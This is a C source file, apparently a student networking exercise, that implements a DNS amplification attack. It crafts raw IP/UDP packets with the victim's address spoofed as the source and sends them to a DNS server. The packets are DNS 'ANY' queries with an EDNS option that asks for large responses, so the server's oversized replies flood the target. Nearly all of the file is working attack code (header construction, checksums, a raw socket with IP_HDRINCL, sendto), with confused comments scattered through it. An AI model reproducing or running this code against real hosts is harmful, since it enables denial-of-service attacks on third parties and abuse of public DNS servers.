#include "dns.h"

// IP Header checksum
// uint16_t checkSum(uint16_t * buff, uint16_t nbytes) {
//     unsigned long sum;
    
//     for(sum = 0; nbytes > 0; nbytes--) {
//         sum += *buff++;
//     }

//     // I can't understand here
//     if (nbytes % 2) {
//         sum += *(uint8_t*)buff;
//     }
    
//     sum = ((sum >> 16) + (sum & 0xFFFF));
//     sum += (sum >> 16);

//     return (uint16_t)(~sum);
// }

uint16_t checkSum(uint16_t * buffer, uint16_t nbytes){
	unsigned long sum = 0;
    // Accumulate checksum
	for(uint16_t i = 0; i < nbytes; i += 2){
        sum += *buffer++;
	}
    // Handle odd-sized case
	if (nbytes % 2){
		sum += *(uint8_t*)buffer;
	}
	// Add carry
	sum = (sum >> 16) + (sum & 0xffff);
	// Add additional carry
	sum += (sum >> 16);
	return (uint16_t)~sum;
}

// fuuuuuuuuuuuuuuuuuuuuuuuuuck, what was that
void constructIPHeader(struct ip * ip_header, const char * src_ip, const char * dst_ip, uint16_t len) {
    ip_header->ip_hl = 5;
    ip_header->ip_v = IPVERSION;//4; // IPVERSION;
    ip_header->ip_tos = IPTOS_PREC_ROUTINE;//16; // IPTOS_PREC_ROUTINE;
    ip_header->ip_id = htons(getpid());
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 64;
    ip_header->ip_p = IPPROTO_UDP;//17; // IPPROTO_UDP;
    ip_header->ip_src.s_addr = inet_addr(src_ip);
    ip_header->ip_dst.s_addr = inet_addr(dst_ip); // put destination IP address
    printf("%d\n",len);
    ip_header->ip_len = sizeof(struct ip) + len;
    ip_header->ip_sum = checkSum((uint16_t *)ip_header, ip_header->ip_len);
}

void constructUDPHeader(struct udphdr * udp_header, int src_port, int dst_port, uint16_t len) {
    udp_header->uh_sport = htons(src_port);
    udp_header->uh_dport = htons(dst_port);
    udp_header->uh_ulen = htons(sizeof(struct udphdr) + len);
    udp_header->uh_sum = 0; // update this value with IPv4CheckSum
}

void formatDNS(char * buff, const char * hostname) {
    // www.google.com => 3www6google3com
    char record[50];

    strncpy(record, hostname, 50);
    strncat(record, ".", 2);

    for (uint16_t i = 0, j = 0; record[i]; i++) {
        if(record[i] == '.') {
            *buff++ = i - j;
            for(; j < i; j++) {
                *buff++ = record[j];
            }
            j++;
        }
    }
    *buff++ = '\0';
}

// what this function does????
uint16_t constructDNS(char * dns_message, const char * hostname, uint16_t record_type) {
    dns_header * dns = (dns_header *)dns_message;
    dns->id = 0x667B; //htons(getpid());
    dns->flags = htons(0x0100); // whaaaaaaaaaaat
    dns->qcount = htons(1);
    dns->answ = 0;
    dns->auth = 0;
    dns->addi = htons(1);

    // create qname
    formatDNS(dns_message + sizeof(dns_header), hostname);
    size_t qname_len = strlen((const char *)(dns_message + sizeof(dns_header))) + 1;

    // create qtype, qclass
    question * q = (question *)(dns_message + sizeof(dns_header) + qname_len);
    q->qtype = htons(record_type);
    q->qclass = htons(1);

    char * edns = (char *)(dns_message + sizeof(dns_header) + qname_len + sizeof(question) + 1);
    memset(edns    , 0x00, 1);
    memset(edns + 1, 0x29, 1);
    memset(edns + 2, 0xFF, 2);
    memset(edns + 4, 0x00, 7);

    return sizeof(dns_header) + qname_len + sizeof(question) + 11;
}

void IPv4CheckSum(const struct ip * ip_header, struct udphdr * udp_header) {
    uint16_t udp_len = ntohs(udp_header->uh_ulen);
    uint16_t ps_len = sizeof(ps_header) + udp_len;
    char * ps_data = malloc(ps_len);

    ps_header * ps = (ps_header *)ps_data;
    ps->ip_src = ip_header->ip_src.s_addr;
    ps->ip_dst = ip_header->ip_dst.s_addr;
    ps->zeroes = 0;
    ps->protocol = IPPROTO_UDP;//17; // IPPROTO_UDP;
    ps->ulen = udp_header->uh_ulen;

    memcpy(ps_data + sizeof(ps_header), udp_header, udp_len);
    udp_header->uh_sum = checkSum((uint16_t *)ps_data, ps_len);

    free(ps_data);
}

void DNSAmpAttack(const char * target_ip, int target_port, const char * server_ip, const char * hostname) {
    // Create datagram ?? 
    char datagram[4096];
    memset(datagram, 0, 4096);

    // Create DNS msg
    char * dns = datagram + sizeof(struct ip) + sizeof(struct udphdr);
    size_t dns_message_len = constructDNS(dns, hostname, RECORD_ANY);

    //Create UDP header
    struct udphdr * udp = (struct udphdr *)(datagram + sizeof(struct ip));
    constructUDPHeader(udp, target_port, DNS_PORT, dns_message_len);

    // Create ip header
    struct ip * ip = (struct ip *)(datagram);
    constructIPHeader(ip, target_ip , server_ip, sizeof(struct udphdr) + dns_message_len);

    // Calculate checksum
    IPv4CheckSum(ip, udp);

    // Setup sockaddr
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(DNS_PORT);
    sin.sin_addr.s_addr = inet_addr(server_ip);

    // Create socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock < 0) {
        printf("Create socket failed\n");
    }

    // Set socket option
    // IPROTO_IP: top level protocol is IP
    // IP_HDRINCL: the application provides the IP header
    const int one = 1;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
        printf("Set sock opt failed\n");
    }

    // Send socket
    if(sendto(sock, datagram, ip->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        printf("Transmission failed\n");
    } else {
        printf("Transmission success\n");
    }

    close(sock);
}